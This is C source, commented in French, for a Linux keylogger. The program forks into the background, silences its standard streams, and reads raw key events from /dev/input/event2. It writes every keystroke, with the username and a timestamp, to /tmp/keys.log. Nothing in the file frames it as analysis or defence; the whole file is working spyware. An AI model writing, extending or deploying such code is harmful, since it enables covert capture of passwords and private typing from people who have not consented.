#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <keys.h>         /* fichier ajouté  et crée  */

#define LOGFILE "/tmp/keys.log"
#define INPUT "/dev/input/event2"

int main(int argc, char **argv)
{

//    Attribution d'un PID   
    
     pid_t pid = fork();
     if(pid < 0) exit(10);
     if(pid > 0) exit(0);

     close(0);
     close(1);
     close(2);

     open("/dev/null", 0);
     open("/dev/null", 1);
     open("/dev/null", 2);   

   
//    Déclarations et initialisations  des variables      

     
     char user[10];              /*      Récupération du user     */
     char time_cmd1[40];         /*      Récupération du temps t1 */  
     char time_cmd2[40];         /*      Récupération du temps t2 */  
     char enreg_str[100];        /*      Récupération des events  */
       
     strcpy(user, getenv("USER"));  /* stocke la variable d'enrironnement USER dans user */ 

//    Affichage récupération de l'heure locale dans time_cmd1
             
     time_t t1, t2;                                    /* déclaration des variables t1 et t2 de type time_t  */       
     struct tm *tmp1, *tmp2;                           /* déclaration de 2 pointeurs structure tm            */ 
     time(&t1);                                        /* init de l'heure à  l'adresse de t1                 */      
     tmp1 = localtime(&t1);                            /* convertion en format heure locale dans le pt tmp1  */  
     strftime(time_cmd1, sizeof(time_cmd1), "%d/%m/%Y " "%H:%M:%S", tmp1);                  /* interpretation de l'heure locale au format dans time_cmd1  */ 
      
     struct input_event ev;                            /* initialisation d'une variable ev de struct input_event dans input.h event interface */       
     
     int fd = open(INPUT, O_RDONLY);                   /* ouverture fichier events en inputs  */ 
     FILE *fp = fopen(LOGFILE, "a");                   /*  ouverture du fichier log  en ouverture */    

//   Affichage Entete 1ere ligne                   
           
     fprintf(fp, "\n%s ", user);                       /* Affichage  du  user  */   
     fprintf(fp, "%s ", time_cmd1);                    /* Affichage  de  l'heure locale */      
           
     while(read(fd, &ev, sizeof(ev)) > 0)              /* Lecture des events boucle      */               
        {
          fgets(enreg_str, 100, fp);
             
           if (ev.type == EV_KEY && ev.value == 0 && ev.code < 112)    
       	    {   
               switch(ev.code)
              { 
           	  case 28:                                   /*     appui touche entrée     */  
           	  time(&t2);
           	  tmp2 = localtime(&t2);                    
           	  strftime(time_cmd2, sizeof(time_cmd2), "%d/%m/%Y " "%H:%M:%S", tmp2);   /*  affichage de l'heure  à chaque press Entrer */    
                  fprintf(fp, "\n%s ", user);
         	  fprintf(fp, "%s ",time_cmd2);
           	  break;

           	  case 57:
           	  fprintf(fp, " ");                           /* touche espace       */ 
           	  break;

           	  default:
           	  fprintf(fp, "%s", keys[ev.code]);            /* récuperation correspondance caractères à partir de keys.h    */     
                  break;
              }
         
           }
    
       }   	
   fclose(fp);
   close(fd);
}
     
